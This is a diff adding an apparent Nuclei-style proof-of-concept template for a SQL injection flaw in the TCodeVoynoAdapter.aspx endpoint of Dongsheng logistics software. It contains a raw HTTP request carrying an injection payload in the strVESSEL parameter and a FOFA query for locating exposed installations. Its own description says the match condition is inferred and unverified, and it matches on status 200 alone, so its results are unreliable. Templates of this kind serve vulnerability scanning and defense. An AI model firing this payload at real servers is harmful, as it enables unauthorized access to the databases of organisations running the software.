@@ -1,0 +1,27 @@
+id: poc-mige5qb3od5c7y3g
+info:
+  name: 东胜物流软件-TCodeVoynoAdapter.aspx接口存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mige5qb3od5c7y3g
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mige5qb3od5c7y3g
+    fofa: body="CompanysAdapter.aspx"
+http:
+- raw:
+  - 'GET /FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1%27+and+user+%3E0%3B-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    Accept-Encoding: gzip'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
